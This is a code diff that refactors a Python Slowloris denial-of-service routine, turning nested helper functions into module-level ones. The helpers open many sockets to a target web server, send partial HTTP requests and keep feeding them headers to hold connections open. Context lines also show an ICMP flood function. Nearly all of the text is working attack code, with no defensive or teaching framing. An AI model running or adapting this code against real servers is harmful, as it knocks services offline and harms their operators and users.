@@ -75,79 +75,65 @@ def icmp_flood(target_ip, count=100):
         log.info(f"ICMP FLOOD - PACKET {i+1}/{count} sent")
     log.info(f"ICMP Flood attack finished on {target_ip}")
 
+def create_socket(target_host, target_port, i, sockets, log):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((target_host, target_port))
+        s.send(f"GET /?{i} HTTP/1.1\r\n".encode())
+        s.send(f"Host: {target_host}\r\n".encode())
+        sockets.append(s)
+        log.info(f"SLOWLORIS - SOCKET {i+1} opened")
+        return True
+    except socket.timeout:
+        log.warning(f"SLOWLORIS - Socket operation timed out for socket {i+1}. Skipping.")
+    except socket.error as e:
+        log.error(f"SLOWLORIS - Socket error {e} when opening socket {i+1}. Skipping.")
+    return False
+
+def send_headers(s, idx, pkt_count, log):
+    try:
+        s.send(b"X-a: b\r\n")
+        log.info(f"SLOWLORIS - HEADER {pkt_count} sent")
+        return True
+    except (socket.timeout, socket.error) as e:
+        log.warning(f"SLOWLORIS - Socket error {type(e).__name__} for socket {idx+1}. Removed.")
+    except Exception as e:
+        log.critical(f"SLOWLORIS - Unexpected error {type(e).__name__} - {e} for socket {idx+1}. Removed.")
+    return False
+
+def initialize_sockets(target_host, target_port, num_sockets, sockets, log):
+    for i in range(num_sockets):
+        create_socket(target_host, target_port, i, sockets, log)
+
+def maintain_attack(sockets, pkt_count, target_host, target_port, log):
+    while sockets:
+        process_sockets(sockets, pkt_count, log)
+        if not sockets:
+            log.warning("SLOWLORIS - No sockets left, stopping attack.")
+            break
+        time.sleep(10)
+
+def process_sockets(sockets, pkt_count, log):
+    for s in list(sockets):
+        pkt_count[0] += 1
+        if not send_headers(s, sockets.index(s), pkt_count[0], log):
+            sockets.remove(s)
+            s.close()
 
 def slowloris_attack(target_host, target_port, num_sockets=50):
-    log.info(
-        f"Starting Slowloris attack on {target_host}:{target_port} (sockets={num_sockets})"
-    )
+    log.info(f"Starting Slowloris attack on {target_host}:{target_port} (sockets={num_sockets})")
     sockets = []
-
-    def create_socket(i):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4)
-            s.connect((target_host, target_port))
-            s.send(f"GET /?{i} HTTP/1.1\r\n".encode())
-            s.send(f"Host: {target_host}\r\n".encode())
-            sockets.append(s)
-            log.info(f"SLOWLORIS - SOCKET {i+1}/{num_sockets} opened")
-            return True
-        except socket.timeout:
-            log.warning(
-                f"SLOWLORIS - Socket operation timed out for socket {i+1}. Skipping."
-            )
-        except socket.error as e:
-            log.error(
-                f"SLOWLORIS - Socket error {e} when opening socket {i+1}. Skipping."
-            )
-        return False
-
-    def send_headers(s, idx):
-        try:
-            s.send(b"X-a: b\r\n")
-            log.info(f"SLOWLORIS - HEADER {pkt_count} sent")
-            return True
-        except (socket.timeout, socket.error) as e:
-            log.warning(
-                f"SLOWLORIS - Socket error {type(e).__name__} for socket {idx+1}. Removed."
-            )
-        except Exception as e:
-            log.critical(
-                f"SLOWLORIS - Unexpected error {type(e).__name__} - {e} for socket {idx+1}. Removed."
-            )
-        return False
-
-    def initialize_sockets():
-        for i in range(num_sockets):
-            create_socket(i)
-
-    def maintain_attack():
-        nonlocal pkt_count
-        while sockets:
-            process_sockets()
-            if not sockets:
-                log.warning("SLOWLORIS - No sockets left, stopping attack.")
-                break
-            time.sleep(10)
-
-    def process_sockets():
-        nonlocal pkt_count
-        for s in list(sockets):  # Use list() to avoid modification during iteration
-            pkt_count += 1
-            if not send_headers(s, sockets.index(s)):
-                sockets.remove(s)
-                s.close()
-
-    initialize_sockets()
-    pkt_count = 0
+    pkt_count = [0]
+    
+    initialize_sockets(target_host, target_port, num_sockets, sockets, log)
 
     try:
-        maintain_attack()
+        maintain_attack(sockets, pkt_count, target_host, target_port, log)
     except KeyboardInterrupt:
         log.info(f"Slowloris attack stopped on {target_host}:{target_port}")
     finally:
         cleanup_sockets(sockets)
-
 
 def cleanup_sockets(sockets):
     for s in sockets:
